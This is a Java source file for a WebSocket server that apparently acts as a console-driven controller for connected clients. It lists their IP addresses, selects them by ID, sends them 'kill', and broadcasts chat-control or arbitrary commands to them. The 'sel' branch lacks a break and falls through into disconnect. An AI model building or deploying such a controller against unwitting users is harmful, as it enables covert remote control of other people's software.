package me.soda.server;


import org.java_websocket.WebSocket;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class Main {

    static List<WebSocket> connCollection;

    @SuppressWarnings("InfiniteLoopStatement")
    public static void main(String[] args) throws IOException {
        Server server = new Server(11451);
        server.start();
        server.log("端口: " + server.getPort());
        BufferedReader inputStream = new BufferedReader(new InputStreamReader(System.in));
        while (true) {
            String in = inputStream.readLine();
            String[] msgArr = in.split(" ");
            if (msgArr.length > 0) {
                try {
                    switch (msgArr[0]) {
                        case "stop":
                            server.stop();
                            break;
                        case "conn":
                            if (msgArr.length == 1) {
                                server.log("----CONNECTIONS----");
                                server.getConnections().forEach(conn -> {
                                    int index = conn.<Integer>getAttachment();
                                    String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
                                    server.log(String.format("IP: %s, ID: %s%n", address, index));
                                });
                            } else {
                                connCollection = new ArrayList<>();
                                switch (msgArr[1]) {
                                    case "sel":
                                        if (msgArr.length == 3) {
                                            server.getConnections().stream().filter(conn -> conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2])).forEach(conn -> connCollection.add(conn));
                                            server.log("Selected client!");
                                        }
                                    case "disconnect":
                                        if (msgArr.length == 3) {
                                            server.getConnections().stream().filter(conn -> conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2])).forEach(conn -> conn.send("kill"));
                                            server.log("Client " + msgArr[2] + " disconnected");
                                        }
                                    default:
                                        break;
                                }
                            }
                            break;
                        case "chat":
                        case "chat_control":
                        case "chat_filter":
                            if (msgArr.length < 2) break;
                            String[] strArr = new String[msgArr.length - 1];
                            System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                            server.broadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)), connCollection);
                            break;
                        default:
                            server.broadcast(in, connCollection);
                            break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}